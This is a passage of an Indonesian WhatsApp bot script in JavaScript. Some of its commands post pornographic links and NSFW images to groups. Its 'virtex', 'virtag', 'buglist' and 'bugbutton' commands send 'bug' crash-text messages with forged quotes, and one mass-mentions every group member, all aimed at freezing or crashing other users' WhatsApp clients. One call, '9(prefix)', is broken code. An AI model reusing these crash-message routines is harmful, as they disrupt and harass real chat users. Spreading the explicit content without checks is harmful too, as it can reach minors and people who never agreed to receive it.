								"buttonText": {
									"displayText": ` - EASY MODE
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MEDIUM MODE -
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - HARD MODE -
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/

══{*BONUS COK*}══
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ftrol})
Hanz.relayWAMessage(res)
break
case  'neko':
if (!isGroup) return reply(mess.only.group)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
but = [
{ buttonId: '!neko', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `SIAPKAN TISU SEBELUM💦`, `${fake}`, anu, but)
break
case  'awoo':
if (!isGroup) return reply(mess.only.group)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
but = [
{ buttonId: '!awoo', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `SIAPKAN TISU SEBELUM💦`, `${fake}`, anu, but)
break
case  'blowjob':
if (!isGroup) return reply(mess.only.group)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
but = [
{ buttonId: '!blowjob', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `SIAPKAN TISU SEBELUM💦`, `${fake}`, anu, but)
break
case  'hentai': 
if (!isGroup) return reply(mess.only.group)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
but = [
{ buttonId: '!hentai', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `SIAPKAN TISU SEBELUM💦`, `${fake}`, anu, but)
break
case  'megumin':
if (!isGroup) return reply(mess.only.group)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
but = [
{ buttonId: '!megumin', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `SIAPKAN TISU SEBELUM💦`, `${fake}`, anu, but)
break
case  'trapnime':
if (!isGroup) return reply(mess.only.group)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
but = [
{ buttonId: '!trapnime', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `SIAPKAN TISU SEBELUM💦`, `${fake}`, anu, but)
break

case 'linkbokep':
                novpn = `[ *API SC* ]\n`
 novpn += `➻ *NO VPN1* : bit.ly/2Qn9Qgu\n`
 novpn += `➻ *NO VPN2* : bit.ly/3gWaBt8\n`
 novpn += `➻ *XNXX VPN* : bit.ly/3vJZJ7n\n`
 reply(novpn)
 break
case 'bokep1':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break          
case 'bokep2':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break  
case 'bokep3':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep4':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep5':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep6':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break      
case 'bokep7':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep8':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep9':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep10':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep11':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep12':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep13':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep14':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep15':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break             
			
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[BUGBOT RASA CACING ᗷY ᕼᗩᑎᘔ Oᖴᑕ ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
//ᑎOTᗴ ᘜᗯ ᗴᑎᑕ ᑕᗩՏᗴ ᗷᑌᘜ Yᗩᑎᘜ ᒪᗩᑎᘜKᗩᕼ ᗪOᗩᑎK Kᗩᒪᗩᑌ Yᗩᑎᘜ Oᒪᗪ ᘜK😒

//PENETRAL KALO ADA BUG TINGGAL KETIK INI
//BIAR VIRUS NYA KEPENDAM
case 'penetral':
reply(`${penawarbug}`)
break
//SEBENAR NYA INI GK GUNA SUMPAH
//TAPI GW GABUT 
case 'virtex':
 if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
 sticWait(from)
  Hanz.sendMessage(from, virtexbytsukasa(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})                 
  Hanz.sendMessage(from, virtex6(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 Hanz.sendMessage(from, hanz(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 Hanz.sendMessage(from, api(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
                  Hanz.sendMessage(from, virtex2(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 Hanz.sendMessage(from, trava(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 Hanz.sendMessage(from, virtex3(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  Hanz.toggleDisappearingMessages(from,`AaaaGoblok`,text)
                  Hanz.sendMessage(from, virtex4(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
                  Hanz.sendMessage(from, virtex5(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
 Hanz.sendMessage(from, virtex6(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  Hanz.sendMessage(from, virtex7(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  Hanz.sendMessage(from, virtex7(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  Hanz.sendMessage(from, 9(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
   Hanz.sendMessage(from, ngazap(prefix),extendedText, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 break
 case 'virtag':  
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `${virtex7(prefix)}`
					for (let mem of groupMembers) {
						teks += ` 
					    @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}   @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} `
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
//ᗷᑌᘜ ᒪIՏT
case 'buglist':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')   
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": 'HANZ々OFC彡',
"description": `𝔅𝔘𝔊𝔏ℑ𝔖𝔗
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Script Bot──➤ ↶↷*
╰•͙✩̣̣̣̣
⁙┃〲◦➛Link Sc: http://bit.ly/3vJZJ7n
⁙┃〲◦➛Link Donasi: https://saweria.co/harisnew
⁙┃〲◦➛Link Instagram: https://www.instagram.com/wong_koclok_
⁙┃〲◦➛Link You Tube: https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${ngazap(prefix)}`,
"buttonText": `⏤͟͞H͜͡A͜͡N͜͡Z͜͡ O͜͡F͜͡C͜͡ G͜͡A͜͡N͜͡Z͜͡${ngazap(prefix)}`,
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
"rows": [ 
{
"title": virtex2(prefix),
"rowId": "Kontol"
},
{
"title": virtex7(prefix),
"rowId": "Kontolodon"
},
{
"title": virtex9(prefix),
"rowId": "Jembot"	       
}  
]
}
]
}
}, {quoted: ftrol})
Hanz.relayWAMessage(res)
break
//ᗷᑌᘜ ᗷᑌTTOᑎ+ᐯIᖇᘜᗩᗰ
  case 'bugbutton':
  if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
  await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
					let contentd = fs.readFileSync('./media/thumnail.jpg')
					let mdia = await Hanz.prepareMessageMedia(contentd, MessageType.image, {thumbnail: fs.readFileSync('./media/virgam.jpeg')})
					let taip = 4;
					let buttons = [
